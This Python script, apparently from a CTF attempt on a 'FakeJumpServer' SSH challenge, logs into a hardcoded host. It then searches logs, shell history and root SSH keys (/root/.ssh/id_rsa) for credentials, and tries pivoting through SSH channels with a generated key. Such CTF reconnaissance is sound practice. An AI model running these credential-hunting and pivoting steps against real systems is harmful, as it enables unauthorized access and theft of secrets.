import paramiko
import socket
import time
import sys
import select

"""
让我重新思考这个问题...

题目提示：
1. "使用SSH的某些特性" - 不是漏洞
2. "类似FakeJumpServer"
3. "第二次SSH连接的报错有用"

关键观察：
- 连接到localhost返回dropbear的host key（相同）
- 连接到172.17.0.1返回OpenSSH的host key（不同）

这意味着：
- 到localhost的连接被dropbear"伪造"了
- 到172.17.0.1的连接是真实转发

如果dropbear是FakeJumpServer...
当真正的管理员通过这个跳板机连接时，
dropbear会伪装成目标服务器，捕获管理员的凭据

但我们不是管理员，我们是攻击者...

等等，让我重新理解FakeJumpServer：
- 跳板机伪装成目标服务器
- 客户端发送凭据时，跳板机记录
- 然后跳板机可能用这些凭据去连接真正的目标

那么问题是：跳板机记录的凭据存在哪里？
如果我们能访问这些日志...

让我检查容器中是否有日志文件
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd, timeout=10):
    """执行命令"""
    try:
        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
        return stdout.read().decode() + stderr.read().decode()
    except Exception as e:
        return f"Error: {e}"

def search_for_logs():
    """搜索日志文件"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 搜索日志文件...")
    
    # 搜索常见日志位置
    log_paths = [
        "/var/log",
        "/var/log/auth.log",
        "/var/log/secure",
        "/var/log/messages",
        "/var/log/syslog",
        "/tmp",
        "/var/tmp",
        "/root",
        "."
    ]
    
    for path in log_paths:
        result = exec_cmd(ssh, f"ls -la {path}")
        if "No such file" not in result and result.strip():
            print(f"\n{path}:")
            print(result[:500])
    
    # 搜索包含password或密码的文件
    print("\n[*] 搜索敏感文件...")
    result = exec_cmd(ssh, "find / -name '*.log' -o -name '*.txt' -o -name '*history*'")
    print(result[:1000])
    
    ssh.close()

def check_shell_history():
    """检查shell历史"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 检查历史记录...")
    
    history_files = [
        "/root/.bash_history",
        "/root/.sh_history",
        "/root/.ash_history",
        "/home/*/.bash_history",
        "~/.history"
    ]
    
    for f in history_files:
        result = exec_cmd(ssh, f"cat {f}")
        if "No such file" not in result and result.strip():
            print(f"\n{f}:")
            print(result[:500])
    
    ssh.close()

def interactive_shell_test():
    """使用交互式shell测试"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 测试交互式shell...")
    
    # 获取PTY shell
    transport = ssh.get_transport()
    channel = transport.open_session()
    channel.get_pty()
    channel.invoke_shell()
    
    time.sleep(0.5)
    
    # 读取欢迎信息
    if channel.recv_ready():
        print("欢迎信息:", channel.recv(4096).decode())
    
    # 检查可用命令
    commands = [
        "which ssh",
        "which nc",
        "which curl",
        "which wget",
        "busybox",
        "ls /bin",
        "cat /proc/version",
        "uname -a"
    ]
    
    for cmd in commands:
        channel.send(cmd + "\n")
        time.sleep(0.3)
        if channel.recv_ready():
            print(f"\n{cmd}:")
            print(channel.recv(4096).decode())
    
    channel.close()
    ssh.close()

def test_subsystems():
    """测试SSH子系统"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试子系统...")
    
    subsystems = ["sftp", "shell", "netconf", "exec"]
    
    for sub in subsystems:
        print(f"\n测试 {sub}:")
        try:
            channel = transport.open_session()
            channel.invoke_subsystem(sub)
            print(f"  成功!")
            
            # 尝试读取一些数据
            channel.settimeout(2)
            try:
                data = channel.recv(100)
                print(f"  数据: {data}")
            except:
                pass
            
            channel.close()
        except Exception as e:
            print(f"  失败: {e}")
    
    ssh.close()

def try_public_key_auth_with_generated_key():
    """
    尝试生成密钥并用公钥认证
    
    思路：如果dropbear接受任意公钥，那就是问题所在
    """
    
    from paramiko import RSAKey
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试公钥认证到localhost...")
    
    # 生成一对密钥
    key = RSAKey.generate(2048)
    
    # 连接到localhost
    channel = transport.open_channel("direct-tcpip", ("localhost", 22), ('127.0.0.1', 0))
    t = paramiko.Transport(channel)
    t.start_client()
    
    # 尝试用我们的密钥
    try:
        t.auth_publickey("ctf", key)
        print("[+] 公钥认证成功!")
        print("    id:", end=" ")
        session = t.open_session()
        session.exec_command("id")
        print(session.recv(1024).decode())
    except paramiko.AuthenticationException:
        print("[-] 公钥认证失败")
    
    t.close()
    
    # 测试172.17.0.1
    print("\n[*] 测试公钥认证到172.17.0.1...")
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    t = paramiko.Transport(channel)
    t.start_client()
    
    try:
        t.auth_publickey("root", key)
        print("[+] 公钥认证成功!")
    except paramiko.AuthenticationException:
        print("[-] 公钥认证失败")
    
    t.close()
    ssh.close()

def read_authorized_keys():
    """检查authorized_keys"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 检查SSH密钥文件...")
    
    paths = [
        "/root/.ssh/authorized_keys",
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_rsa.pub",
        "/etc/dropbear/authorized_keys",
        "/etc/ssh/authorized_keys"
    ]
    
    for p in paths:
        result = exec_cmd(ssh, f"cat {p}")
        if "No such file" not in result and "can't open" not in result:
            print(f"\n{p}:")
            print(result[:500])
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 深入探索")
    print("="*60)
    
    print("\n[1] 搜索日志")
    search_for_logs()
    
    print("\n[2] 检查历史")
    check_shell_history()
    
    print("\n[3] 交互式shell测试")
    interactive_shell_test()
    
    print("\n[4] 测试子系统")
    test_subsystems()
    
    print("\n[5] 检查SSH密钥")
    read_authorized_keys()
    
    print("\n[6] 测试公钥认证")
    try_public_key_auth_with_generated_key()
